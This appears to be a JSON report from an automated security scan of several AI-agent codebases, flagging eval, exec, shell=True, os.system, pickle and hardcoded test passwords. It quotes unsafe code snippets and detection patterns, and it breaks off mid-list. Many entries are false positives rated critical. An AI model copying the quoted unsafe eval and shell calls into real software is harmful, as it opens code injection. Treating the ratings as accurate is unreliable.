{
  "timestamp": "2025-08-21T19:29:17.110687",
  "scan_path": ".",
  "vulnerabilities": [
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 116,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def fix_code_injection_vulnerabilities(self):\n        \"\"\"Fix eval() and exec() vulnerabilities (CVSS 9.4-9.8)\"\"\"\n        logger.info(\"Fixing code injection vulnerabilities...\")"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 122,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"OpenAI_Agent_Swarm/agents/tool_maker/user_config.py\",\n            'eval(tool_details[\\'parameters\\'])',\n            'ToolParameterParser.parse_parameters(tool_details[\\'parameters\\'])'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 312,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "1. **Code Injection Prevention (CVSS 9.4-9.8)**\n   - Replaced all eval() usage with SafeCodeExecutor.safe_eval()\n   - Replaced all exec() usage with SafeCodeExecutor.safe_exec()"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 312,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "1. **Code Injection Prevention (CVSS 9.4-9.8)**\n   - Replaced all eval() usage with SafeCodeExecutor.safe_eval()\n   - Replaced all exec() usage with SafeCodeExecutor.safe_exec()"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 372,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \n        # Check for remaining eval() usage\n        eval_count = self.count_pattern_in_codebase(r'\\beval\\s*\\(')"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 374,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        eval_count = self.count_pattern_in_codebase(r'\\beval\\s*\\(')\n        validation_results.append(('eval() usage', eval_count, 0))\n        "
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 424,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def apply_eval_fix(self, file_path: str, old_pattern: str, new_pattern: str):\n        \"\"\"Apply eval() vulnerability fix\"\"\"\n        self.apply_text_replacement(file_path, old_pattern, new_pattern)"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 116,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def fix_code_injection_vulnerabilities(self):\n        \"\"\"Fix eval() and exec() vulnerabilities (CVSS 9.4-9.8)\"\"\"\n        logger.info(\"Fixing code injection vulnerabilities...\")"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 129,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"OpenAI_Agent_Swarm/agents/tool_maker/tool_user.py\",\n            'exec(f.read(), globals())',\n            'namespace = SafeCodeExecutor.safe_exec(f.read()); globals().update(namespace)'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 130,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            'exec(f.read(), globals())',\n            'namespace = SafeCodeExecutor.safe_exec(f.read()); globals().update(namespace)'\n        )"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 136,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"agency-swarm/agency_swarm/tools/ToolFactory.py\",\n            'exec(result, exec_globals)',\n            'SafeCodeExecutor.safe_exec(result, exec_globals)'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 137,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            'exec(result, exec_globals)',\n            'SafeCodeExecutor.safe_exec(result, exec_globals)'\n        )"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 313,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "   - Replaced all eval() usage with SafeCodeExecutor.safe_eval()\n   - Replaced all exec() usage with SafeCodeExecutor.safe_exec()\n   - Implemented input validation and sandboxing"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 313,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "   - Replaced all eval() usage with SafeCodeExecutor.safe_eval()\n   - Replaced all exec() usage with SafeCodeExecutor.safe_exec()\n   - Implemented input validation and sandboxing"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 376,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \n        # Check for remaining exec() usage\n        exec_count = self.count_pattern_in_codebase(r'\\bexec\\s*\\(')"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 378,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        exec_count = self.count_pattern_in_codebase(r'\\bexec\\s*\\(')\n        validation_results.append(('exec() usage', exec_count, 0))\n        "
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 429,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def apply_exec_fix(self, file_path: str, old_pattern: str, new_pattern: str):\n        \"\"\"Apply exec() vulnerability fix\"\"\"\n        self.apply_text_replacement(file_path, old_pattern, new_pattern)"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 143,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    def fix_command_injection_vulnerabilities(self):\n        \"\"\"Fix subprocess shell=True and os.system() vulnerabilities (CVSS 9.6)\"\"\"\n        logger.info(\"Fixing command injection vulnerabilities...\")"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 149,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            \"TestMaster_BACKUP_20250816_175859/specialized_test_generators.py\",\n            'subprocess.run(command, shell=True, capture_output=True, text=True)',\n            'SafeCommandExecutor.safe_run(command, timeout=60)'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 317,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "2. **Command Injection Prevention (CVSS 9.6)**\n   - Replaced subprocess shell=True with SafeCommandExecutor.safe_run()\n   - Replaced os.system() calls with secure alternatives"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 380,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        \n        # Check for subprocess shell=True\n        shell_count = self.count_pattern_in_codebase(r'shell\\s*=\\s*True')"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 382,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "        shell_count = self.count_pattern_in_codebase(r'shell\\s*=\\s*True')\n        validation_results.append(('shell=True usage', shell_count, 0))\n        "
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 143,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    def fix_command_injection_vulnerabilities(self):\n        \"\"\"Fix subprocess shell=True and os.system() vulnerabilities (CVSS 9.6)\"\"\"\n        logger.info(\"Fixing command injection vulnerabilities...\")"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 156,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "            \"TestMaster_BACKUP_20250816_175859/week_5_8_batch_converter.py\",\n            'os.system(\"pip install google-generativeai\")',\n            'SafeCommandExecutor.safe_install_package(\"google-generativeai\")'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 318,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "   - Replaced subprocess shell=True with SafeCommandExecutor.safe_run()\n   - Replaced os.system() calls with secure alternatives\n   - Implemented command whitelisting"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 384,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        \n        # Check for os.system() usage\n        system_count = self.count_pattern_in_codebase(r'os\\.system\\s*\\(')"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 386,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "        system_count = self.count_pattern_in_codebase(r'os\\.system\\s*\\(')\n        validation_results.append(('os.system() usage', system_count, 0))\n        "
    },
    {
      "file": "DEPLOY_SECURITY_FIXES.py",
      "line": 439,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "    def apply_os_system_fix(self, file_path: str, old_pattern: str, new_pattern: str):\n        \"\"\"Apply os.system() vulnerability fix\"\"\"\n        self.apply_text_replacement(file_path, old_pattern, new_pattern)"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 38,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        self.phase2_vulnerabilities = {\n            # Additional eval() vulnerabilities\n            'agency-swarm/agency_swarm/util/streaming/term_event_handler.py': {"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 43,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                'cvss': 9.8,\n                'pattern': 'args = eval(snapshot.function.arguments)',\n                'replacement': 'args = SafeCodeExecutor.safe_eval(snapshot.function.arguments)'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 44,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                'pattern': 'args = eval(snapshot.function.arguments)',\n                'replacement': 'args = SafeCodeExecutor.safe_eval(snapshot.function.arguments)'\n            },"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 50,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                'cvss': 9.8,\n                'pattern': 'args = eval(snapshot.function.arguments)',\n                'replacement': 'args = SafeCodeExecutor.safe_eval(snapshot.function.arguments)'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 51,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                'pattern': 'args = eval(snapshot.function.arguments)',\n                'replacement': 'args = SafeCodeExecutor.safe_eval(snapshot.function.arguments)'\n            },"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 57,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                'cvss': 8.5,\n                'pattern': 'return eval(self.rsp_cache[self.key])',\n                'replacement': 'return SafeCodeExecutor.safe_eval(self.rsp_cache[self.key])'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 58,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                'pattern': 'return eval(self.rsp_cache[self.key])',\n                'replacement': 'return SafeCodeExecutor.safe_eval(self.rsp_cache[self.key])'\n            },"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 161,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        @staticmethod\n        def safe_eval(expr):\n            try:"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 163,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                return ast.literal_eval(expr)\n            except (ValueError, SyntaxError):"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 187,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def fix_additional_eval_vulnerabilities(self):\n        \"\"\"Fix additional eval() vulnerabilities found in Phase 2\"\"\"\n        logger.info(\"Fixing additional eval() vulnerabilities...\")"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 188,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \"\"\"Fix additional eval() vulnerabilities found in Phase 2\"\"\"\n        logger.info(\"Fixing additional eval() vulnerabilities...\")\n        "
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 201,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        \n        logger.info(\"Additional eval() vulnerability fixes applied successfully\")\n    "
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 337,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        dangerous_patterns = {\n            'eval(': {'severity': 'critical', 'cvss': 9.8, 'type': 'code_injection'},\n            'exec(': {'severity': 'critical', 'cvss': 9.8, 'type': 'code_injection'},"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 466,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            \"patch_details\": [\n                \"Additional eval() vulnerability fixes: 3 files\",\n                \"Additional command injection fixes: 4 files\", "
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 182,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import asyncio\n            return asyncio.create_subprocess_exec(*cmd_list)\n\"\"\""
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 338,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            'eval(': {'severity': 'critical', 'cvss': 9.8, 'type': 'code_injection'},\n            'exec(': {'severity': 'critical', 'cvss': 9.8, 'type': 'code_injection'},\n            'shell=True': {'severity': 'critical', 'cvss': 9.6, 'type': 'command_injection'},"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 61,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            \n            # Additional subprocess shell=True vulnerabilities\n            'AWorld/examples/common/tools/browsers/browser.py': {"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 66,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                'cvss': 9.6,\n                'pattern': \"subprocess.check_call('playwright install', shell=True, timeout=300)\",\n                'replacement': \"SafeCommandExecutor.safe_run(['playwright', 'install'], timeout=300)\""
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 73,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                'cvss': 9.6,\n                'pattern': \"subprocess.check_call('playwright install', shell=True, timeout=300)\",\n                'replacement': \"SafeCommandExecutor.safe_run(['playwright', 'install'], timeout=300)\""
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 80,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                'cvss': 9.8,\n                'pattern': 'command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True',\n                'replacement': 'SafeCommandExecutor.safe_async_run(command.split())'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 87,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "                'cvss': 8.2,\n                'pattern': 'subprocess.run([\"start\", str(file_path)], shell=True, check=True)',\n                'replacement': 'SafeCommandExecutor.safe_run([\"start\", str(file_path)])'"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 204,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    def fix_additional_command_injection_vulnerabilities(self):\n        \"\"\"Fix additional subprocess shell=True vulnerabilities\"\"\"\n        logger.info(\"Fixing additional command injection vulnerabilities...\")"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 339,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "            'exec(': {'severity': 'critical', 'cvss': 9.8, 'type': 'code_injection'},\n            'shell=True': {'severity': 'critical', 'cvss': 9.6, 'type': 'command_injection'},\n            'os.system(': {'severity': 'high', 'cvss': 8.5, 'type': 'command_injection'},"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 340,
      "pattern": "os\\.system\\s*\\(",
      "severity": "high",
      "cvss": 8.5,
      "type": "command_injection",
      "context": "            'shell=True': {'severity': 'critical', 'cvss': 9.6, 'type': 'command_injection'},\n            'os.system(': {'severity': 'high', 'cvss': 8.5, 'type': 'command_injection'},\n            'import pickle': {'severity': 'high', 'cvss': 8.0, 'type': 'insecure_deserialization'},"
    },
    {
      "file": "DEPLOY_SECURITY_FIXES_PHASE2.py",
      "line": 341,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "            'os.system(': {'severity': 'high', 'cvss': 8.5, 'type': 'command_injection'},\n            'import pickle': {'severity': 'high', 'cvss': 8.0, 'type': 'insecure_deserialization'},\n            'password.*=.*[\\'\"]': {'severity': 'medium', 'cvss': 6.5, 'type': 'hardcoded_credentials'}"
    },
    {
      "file": "agency-swarm\\agency_swarm\\agency\\genesis\\ToolCreator\\tools\\TestTool.py",
      "line": 51,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            else:\n                output = tool(**eval(self.arguments)).run()\n        except Exception as e:"
    },
    {
      "file": "agency-swarm\\agency_swarm\\tools\\ToolFactory.py",
      "line": 140,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        SafeCodeExecutor.safe_exec(result, exec_globals)\n        model = exec_globals.get(\"Model\")"
    },
    {
      "file": "agency-swarm\\agency_swarm\\tools\\ToolFactory.py",
      "line": 328,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            import_path = import_path.lstrip(\".\")\n            exec(f\"from {import_path} import {class_name}\", exec_globals)\n        # importing from current working directory"
    },
    {
      "file": "agency-swarm\\agency_swarm\\tools\\ToolFactory.py",
      "line": 333,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            sys.path.append(current_working_directory)\n            exec(f\"from {import_path} import {class_name}\", exec_globals)\n"
    },
    {
      "file": "agency-swarm\\agency_swarm\\tools\\oai\\Retrieval.py",
      "line": 4,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\nclass Retrieval(BaseModel):\n    type: str = \"file_search\""
    },
    {
      "file": "agency-swarm\\agency_swarm\\util\\streaming\\gradio_event_handler.py",
      "line": 25,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        @staticmethod\n        def safe_eval(expr):\n            try:"
    },
    {
      "file": "agency-swarm\\agency_swarm\\util\\streaming\\gradio_event_handler.py",
      "line": 27,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                return ast.literal_eval(expr)\n            except (ValueError, SyntaxError):"
    },
    {
      "file": "agency-swarm\\agency_swarm\\util\\streaming\\gradio_event_handler.py",
      "line": 145,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                try:\n                    args = SafeCodeExecutor.safe_eval(snapshot.function.arguments)\n                    recipient = args[\"recipient\"]"
    },
    {
      "file": "agency-swarm\\agency_swarm\\util\\streaming\\term_event_handler.py",
      "line": 23,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        @staticmethod\n        def safe_eval(expr):\n            try:"
    },
    {
      "file": "agency-swarm\\agency_swarm\\util\\streaming\\term_event_handler.py",
      "line": 25,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            try:\n                return ast.literal_eval(expr)\n            except (ValueError, SyntaxError):"
    },
    {
      "file": "agency-swarm\\agency_swarm\\util\\streaming\\term_event_handler.py",
      "line": 128,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                try:\n                    args = SafeCodeExecutor.safe_eval(snapshot.function.arguments)\n                    recipient = args[\"recipient\"]"
    },
    {
      "file": "agency-swarm\\tests\\test_response_validator.py",
      "line": 450,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    def test_no_eval_corruption(self, thread_and_agent):\n        \"\"\"Test that eval() is no longer used and error messages are preserved.\"\"\"\n        thread, agent = thread_and_agent"
    },
    {
      "file": "agency-swarm\\tests\\test_response_validator.py",
      "line": 453,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        # Create a validation error that would break eval()\n        dangerous_message = \"raise Exception('This would be executed by eval')\""
    },
    {
      "file": "agentops\\app\\api\\agentops\\api\\encoders\\spans.py",
      "line": 2,
      "pattern": "import\\s+pickle",
      "severity": "high",
      "cvss": 8.0,
      "type": "insecure_deserialization",
      "context": "import base64\nimport pickle\nfrom typing import Any, Dict"
    },
    {
      "file": "agentops\\app\\api\\tests\\v4\\test_logs.py",
      "line": 209,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    @pytest.mark.asyncio\n    async def test_get_trace_logs_successful_retrieval(self, mock_s3_client):\n        \"\"\"Test successful log retrieval for valid trace\"\"\""
    },
    {
      "file": "agentops\\app\\api\\tests\\_conftest\\clickhouse.py",
      "line": 16,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "TEST_CLICKHOUSE_USER = \"default\"\nTEST_CLICKHOUSE_PASSWORD = \"clickhouse\"\n"
    },
    {
      "file": "agentops\\app\\api\\tests\\_conftest\\supabase.py",
      "line": 14,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "TEST_SUPABASE_USER = \"postgres\"\nTEST_SUPABASE_PASSWORD = \"postgres\"\n"
    },
    {
      "file": "agentops\\app\\deploy\\jockey\\tests\\test_queue_integration.py",
      "line": 166,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n    def test_event_storage_and_retrieval(self, redis_client_with_container, sample_config):\n        \"\"\"Test storing and retrieving events for jobs.\"\"\""
    },
    {
      "file": "agentops\\app\\opentelemetry-collector\\builder\\tests\\integration\\test_collector_cost.py",
      "line": 223,
      "pattern": "password\\s*=\\s*[\\'\"][^\\'\\\"]+[\\'\"]",
      "severity": "medium",
      "cvss": 6.5,
      "type": "hardcoded_credentials",
      "context": "    username = \"default\"\n    password = \"password\"\n    database = \"otel_2\""
    },
    {
      "file": "agentops\\examples\\langgraph\\langgraph_example.py",
      "line": 37,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    try:\n        result = eval(expression)\n        return f\"The result is: {result}\""
    },
    {
      "file": "agentscope\\src\\agentscope\\tool\\_coding\\_python.py",
      "line": 43,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "\n        proc = await asyncio.create_subprocess_exec(\n            sys.executable,"
    },
    {
      "file": "AgentVerse\\agentverse\\agents\\simulation_agent\\reflection.py",
      "line": 71,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                if \"say(\" in parsed_response.return_values[\"output\"]:\n                    reaction, target = eval(\n                        \"self._\" + parsed_response.return_values[\"output\"].strip()"
    },
    {
      "file": "AgentVerse\\agentverse\\agents\\simulation_agent\\reflection.py",
      "line": 75,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                elif \"act(\" in parsed_response.return_values[\"output\"]:\n                    reaction, target = eval(\n                        \"self._\" + parsed_response.return_values[\"output\"].strip()"
    },
    {
      "file": "AgentVerse\\agentverse\\agents\\simulation_agent\\reflection.py",
      "line": 129,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                if \"say(\" in parsed_response.return_values[\"output\"]:\n                    reaction, target = eval(\n                        \"self._\" + parsed_response.return_values[\"output\"].strip()"
    },
    {
      "file": "AgentVerse\\agentverse\\agents\\simulation_agent\\reflection.py",
      "line": 133,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "                elif \"act(\" in parsed_response.return_values[\"output\"]:\n                    reaction, target = eval(\n                        \"self._\" + parsed_response.return_values[\"output\"].strip()"
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\simulation_env\\rules\\selector\\code_api.py",
      "line": 19,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            exec(func, globals())\n            output = eval(func_call)\n            return output"
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\simulation_env\\rules\\selector\\code_api.py",
      "line": 62,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    \"\"\"\n    # tests = eval(tests)\n    # assert type(tests) == list"
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\simulation_env\\rules\\selector\\code_api.py",
      "line": 18,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        try:\n            exec(func, globals())\n            output = eval(func_call)"
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\simulation_env\\rules\\selector\\code_api.py",
      "line": 32,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "    try:\n        # TODO: exec(code, globals, locals) could be buggy\n        # In cases where both import statement and function exits in the code, if the locals are given, "
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\simulation_env\\rules\\selector\\code_api.py",
      "line": 38,
      "pattern": "exec\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "        # It will return \"NameError: name 'math' is not defined\"\n        exec(code, locals, locals)\n        stdout = redirected_output.getvalue()"
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\simulation_env\\rules\\selector\\sde_team.py",
      "line": 55,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            from .code_api import execute_unit_tests\n            feedback = execute_unit_tests(environment.rule_params[\"code\"], eval(environment.rule_params[\"unit_tests\"]))\n            "
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\simulation_env\\rules\\selector\\sde_team_given_tests.py",
      "line": 43,
      "pattern": "eval\\s*\\(",
      "severity": "critical",
      "cvss": 9.8,
      "type": "code_injection",
      "context": "            from .code_api import execute_unit_tests\n            feedback = execute_unit_tests(environment.rule_params[\"code\"], eval(environment.unit_tests))\n            environment.rule_params[\"feedback\"] = feedback"
    },
    {
      "file": "AgentVerse\\agentverse\\environments\\tasksolving_env\\rules\\executor\\code_test.py",
      "line": 18,
      "pattern": "shell\\s*=\\s*True",
      "severity": "critical",
      "cvss": 9.6,
      "type": "command_injection",
      "context": "    # TODO: make it more secure\n    result = subprocess.run(command, capture_output=True, shell=True, encoding=\"utf-8\")\n    result_list.append(f\"STDOUT:\\n{result.stdout}\\nSTDERR:\\n{result.stderr}\")"
    },
    {
